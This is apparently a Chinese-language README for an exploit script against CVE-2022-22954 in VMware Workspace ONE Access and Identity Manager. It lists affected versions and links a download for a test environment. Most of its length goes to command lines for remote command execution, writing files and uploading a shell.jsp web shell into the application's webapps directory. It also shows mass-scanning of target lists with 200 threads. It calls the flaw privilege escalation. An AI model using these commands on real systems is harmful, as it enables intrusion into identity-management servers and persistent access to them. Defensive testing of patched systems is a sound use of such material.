### 漏洞标题： CVE-2022-22954

### 漏洞描述：

VMware Workspace ONE Access（以前称为VMware Identity Manager）旨在通过多因素身份验证、条件访问和单点登录，让您的员工更快地访问SaaS、Web和本机移动应用程序。

### 影响范围：

VMware Workspace ONE Access Appliance （版本号：20.10.0.0 ，20.10.0.1 ，21.08.0.0 ，21.08.0.1 ）
VMware Identity Manager Appliance （版本号：3.3.3 ， 3.3.4 ， 3.3.5 ，3.3.6）
VMware Realize Automation （版本号：7.6）

### 漏洞来源：

CVE-2022-22954

### 漏洞类型：

提权漏洞

## 复现环境

VMware Workspace ONE Access下载链接 
百度网盘 链接：https://pan.baidu.com/s/1Y204Z0tk_ZKH3UInPFMrfA 提取码：7v1q

## 漏洞验证

多个漏洞触发点检测，多线程批量检测，命令执行，文件写入

// 单个目标漏洞检测
python CVE-2022-22954.py -u https://x.x.x.x

// 命令执行
python CVE-2022-22954.py -u https://x.x.x.x -c "id"

// 写文件
python CVE-2022-22954.py -u https://x.x.x.x -fn test.jsp  -fc "test"

// 上传文件，windows 设置文件名需要指定路径
python CVE-2022-22954.py -u https://x.x.x.x -fn test.jsp  -fp "D:\Desktop\shell.jsp"

// 上传到指定路径
python CVE-2022-22954.py -u https://x.x.x.x -fn "/opt/vmware/horizon/workspace/webapps/catalog-portal/test.jsp"  -fp "D:\Desktop\shell.jsp"

// 批量检测，用法一致
python CVE-2022-22954.py -f url.txt
python CVE-2022-22954.py -f url.txt -c "id" -t 200
python CVE-2022-22954.py -f url.txt -fn test.jsp  -fc "test" -t 200
python CVE-2022-22954.py -f url.txt -fn test.jsp  -fp "D:\Desktop\shell.jsp" -t 200
python CVE-2022-22954.py -f url.txt -fn "/opt/vmware/horizon/workspace/webapps/catalog-portal/test.jsp"  -fp "D:\Desktop\shell.jsp" -t 200
